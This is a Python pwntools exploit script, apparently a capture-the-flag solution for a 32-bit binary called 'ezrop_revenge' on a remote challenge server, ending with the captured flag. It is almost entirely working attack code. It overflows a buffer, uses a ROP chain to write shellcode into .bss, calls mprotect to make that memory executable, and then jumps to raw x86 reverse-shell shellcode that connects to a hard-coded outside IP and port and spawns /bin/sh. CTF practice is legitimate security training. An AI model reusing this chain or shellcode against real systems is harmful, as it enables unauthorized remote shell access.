from pwn import *
import socket, struct

elf = ELF('./ezrop_revenge', checksec=False)
#p = elf.process()
p = remote('not.codepwnda.id', 17005)
def syscall(eax, ebx=0, ecx=0, edx=0):    
    payload = b''.join([
        p32(0x080ab5ca), p32(eax),
        p32(0x0806eeb2), p32(ecx), p32(ebx),
        p32(0x0806ee8b), p32(edx),
        p32(0x0806f7c0) # int 0x80
    ])
    return payload

def write_what_where(dest, src):
    payload = b''.join([
        p32(0x080ab5ca), b'%s' % src.ljust(4, b'\x00'),
        p32(0x0806ee8b), p32(dest),
        p32(0x08057bd2) # mov dword ptr [edx], eax ; ret
    ])
    return payload

def write_str(where, data):
    payload  = b''
    data_split = [data[i:i+4].ljust(4, b'\x00') for i in range(0, len(data), 4)]
    for d in data_split:
        payload += write_what_where(where, d)
        where += 4
    return payload

# revershe shell
ip = b'%s' % asm('push {0}'.format(struct.unpack("!I", socket.inet_aton('152.70.188.18'))[0])) # 18.188.70.152
port = b'%s' % asm('pushw {0}'.format(socket.htons(1339)))
shellcode =b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66" + ip + port + b"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

payload = b''.join([
    b'A'*0x14,
    write_str(elf.bss(), b'\x90'*20+shellcode),
    syscall(0x7d, 0x80db000, 0x4000, 0x7),
    p32(elf.bss())
])
p.sendlineafter(b'!\n', payload)
p.interactive()
# codepwnda{woa___how_did_you_get_this_991bcde_btw_kamu_gak_copy_paste_jawaban_kan?}